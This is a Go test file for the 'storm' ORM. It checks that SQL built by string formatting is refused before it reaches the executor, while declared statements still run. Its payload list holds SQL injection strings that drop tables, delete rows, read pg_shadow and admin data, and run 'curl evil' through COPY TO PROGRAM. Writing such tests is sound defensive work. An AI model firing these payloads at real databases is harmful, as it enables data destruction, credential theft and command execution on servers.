package storm_test

import (
	"context"
	"fmt"
	"strings"
	"testing"

	"github.com/gsoultan/storm"
	"github.com/gsoultan/storm/runtime"
)

// The injection corpus.
//
// storm's ordinary reads cannot carry a caller's string into SQL text at all:
// a predicate is a stream of compiler-generated ids and the values travel as
// bound arguments. storm.SQL is the one declaration that holds a string, and
// the trap is that RegisterScanner keys by ROW TYPE — a scanner declared for
// one query answers for any query returning that type, so a statement built
// with fmt.Sprintf would otherwise execute on the strength of a scanner it
// never declared.
//
// These assert the refusal happens BEFORE the executor is reached, which is
// the only place a refusal is worth anything.

type injRow struct {
	Email string
}

func init() {
	// A scanner for injRow exists, exactly as it would if any legitimate
	// query returned this type. It must not make a forged statement runnable.
	storm.RegisterScanner(func(rv [][]byte, r *injRow, sl *runtime.Slab) error {
		r.Email = sl.Str(rv[0])
		return nil
	})
}

// noExec fails the test if anything reaches the server.
type noExec struct {
	t *testing.T
}

func (e *noExec) Query(_ context.Context, sql string, _ []any) (runtime.Rows, error) {
	e.t.Fatalf("an undeclared statement reached the server: %s", sql)
	return nil, nil
}

func (e *noExec) Exec(_ context.Context, sql string, _ []any) (int64, error) {
	e.t.Fatalf("an undeclared statement reached the server: %s", sql)
	return 0, nil
}

func (e *noExec) CopyFrom(context.Context, string, []string, runtime.CopySource) (int64, error) {
	return 0, nil
}

func (e *noExec) Batch(context.Context, []runtime.BatchOp, func(int, runtime.Rows, int64, error) error) error {
	return nil
}

var injPayloads = []string{
	`x' OR '1'='1`,
	`x'; DROP TABLE users; --`,
	`x' UNION SELECT email FROM admin_users --`,
	`x'); DELETE FROM orders WHERE ('1'='1`,
	`x' AND pg_sleep(10) --`,
	`x'/**/UNION/**/SELECT/**/current_setting('is_superuser')--`,
	`x' AND 1=(SELECT count(*) FROM pg_shadow) --`,
	"x\\'; SELECT 1; --",
	`admin'--`,
	`'; COPY users TO PROGRAM 'sh -c "curl evil"'; --`,
}

// A statement assembled at run time does not run, whatever it says.
func TestInjectedQueryIsRefusedBeforeExecution(t *testing.T) {
	ctx := context.Background()
	for _, payload := range injPayloads {
		// The shape an injection actually takes: a declared-looking query with
		// a value concatenated in instead of bound.
		forged := storm.SQL[injRow](
			fmt.Sprintf(`SELECT email FROM users WHERE email = '%s'`, payload))

		_, err := forged.Query(ctx, &noExec{t})
		if err == nil {
			t.Fatalf("payload %q produced a runnable query", payload)
		}
		if !strings.Contains(err.Error(), "not declared at generate time") {
			t.Fatalf("payload %q was refused for the wrong reason: %v", payload, err)
		}
	}
}

// The same for the exec half, which has no row type to lean on at all.
func TestInjectedExecIsRefusedBeforeExecution(t *testing.T) {
	ctx := context.Background()
	for _, payload := range injPayloads {
		forged := storm.SQLExec(
			fmt.Sprintf(`DELETE FROM sessions WHERE token = '%s'`, payload))
		if _, err := forged.Exec(ctx, &noExec{t}); err == nil {
			t.Fatalf("payload %q produced a runnable statement", payload)
		}
	}
}

// The refusal is not a blanket "raw SQL is off": a declared statement runs.
// Registration is what `storm generate` emits, and it is content-addressed, so
// a statement that drifts by one byte from the one that was PREPAREd is a
// different statement and is refused with it.
var injDeclared = storm.SQLExec(`DELETE FROM sessions WHERE token = $1`)

func init() { storm.RegisterStatement(`DELETE FROM sessions WHERE token = $1`) }

func TestDeclaredStatementRuns(t *testing.T) {
	ex := &execRecorder{}
	n, err := injDeclared.Exec(context.Background(), ex, "tok")
	if err != nil {
		t.Fatal(err)
	}
	if n != 7 || ex.sql != `DELETE FROM sessions WHERE token = $1` {
		t.Fatalf("declared statement did not run: %q -> %d", ex.sql, n)
	}
}

// One byte of drift is a different statement. This is what makes the check
// worth having: it pins the exact text the generator PREPAREd, not a shape.
func TestDriftedStatementIsRefused(t *testing.T) {
	drifted := storm.SQLExec(`DELETE FROM sessions WHERE token = $1 `)
	if _, err := drifted.Exec(context.Background(), &noExec{t}, "tok"); err == nil {
		t.Fatal("a statement one byte from the declared one ran")
	}
}
